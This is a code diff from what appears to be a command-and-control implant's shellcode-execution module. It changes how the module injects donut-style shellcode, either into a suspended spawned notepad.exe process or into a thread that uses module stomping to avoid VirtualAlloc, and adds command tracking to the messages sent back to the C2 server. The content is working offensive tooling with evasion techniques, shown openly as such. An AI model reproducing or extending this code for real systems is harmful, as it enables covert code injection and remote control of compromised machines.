@@ -21,6 +21,7 @@
 
 #define BUFSIZE 2048
 
+// Max duration of the shellcode execution befor it's killed
 const int maxDurationShellCode=120;
 
 using namespace std;
@@ -160,7 +161,15 @@ int AssemblyExec::init(std::vector<std::string> &splitedCmd, C2Message &c2Messag
 			return -1;
 		}
 
+		std::string cmd;
+		for (int idx = 1; idx < splitedCmd.size(); idx++) 
+		{
+			cmd+=splitedCmd[idx];
+			cmd+=" ";
+		}
+
 		c2Message.set_pid(pid);
+		c2Message.set_cmd(cmd);
 		c2Message.set_instruction(splitedCmd[0]);
 		c2Message.set_inputfile(inputFile);
 		c2Message.set_data(payload.data(), payload.size());
@@ -267,16 +276,22 @@ int AssemblyExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 
 #elif _WIN32
 
-	// if we create a process we need to exite process with donut shellcode
-	// Otherwise we exite the thread
-	createNewProcess(payload, result);
+	bool isInjectIntoNewProcess=true;
+	std::string processToSpawn="notepad.exe";
 
-	// createNewThread(payload, result);
+	// if we create a process we need to exite process with donut shellcode
+	if(isInjectIntoNewProcess)
+		createNewProcess(payload, processToSpawn, result);
+
+	// Otherwise we exite the thread
+	else
+		createNewThread(payload, result);
 
 #endif
 
+	
 	c2RetMessage.set_instruction(m_name);
-	c2RetMessage.set_cmd("");
+	c2RetMessage.set_cmd(c2Message.cmd());
 	c2RetMessage.set_returnvalue(result);
 
 	return 0;
@@ -285,6 +300,8 @@ int AssemblyExec::process(C2Message &c2Message, C2Message &c2RetMessage)
 #ifdef _WIN32
 
 
+// Create new thread to run the shellcode, the memory use to inject the payload is taken from a DLL (Module Stomping)
+// loaded specialy for this purpose. It avoid to use VirtualAlloc.
 int AssemblyExec::createNewThread(const std::string& payload, std::string& result)
 {
 	StdCapture stdCapture;
@@ -313,7 +330,8 @@ int AssemblyExec::createNewThread(const std::string& payload, std::string& resul
 }
 
 
-int AssemblyExec::createNewProcess(const std::string& payload, std::string& result)
+// Create a new process in suspended mode to run the shellcode.
+int AssemblyExec::createNewProcess(const std::string& payload, const std::string& processToSpawn, std::string& result)
 {
 	HANDLE g_hChildStd_OUT_Rd = NULL;
 	HANDLE g_hChildStd_OUT_Wr = NULL;
@@ -362,7 +380,6 @@ int AssemblyExec::createNewProcess(const std::string& payload, std::string& resu
     siStartInfo.dwFlags |= STARTF_USESTDHANDLES;
 
     // Create the child process. 
-	std::string processToSpawn="notepad.exe";
 	bSuccess = CreateProcess(NULL, const_cast<LPSTR>(processToSpawn.c_str()), NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &siStartInfo, &piProcInfo);
     CloseHandle(g_hChildStd_ERR_Wr);
     CloseHandle(g_hChildStd_OUT_Wr);
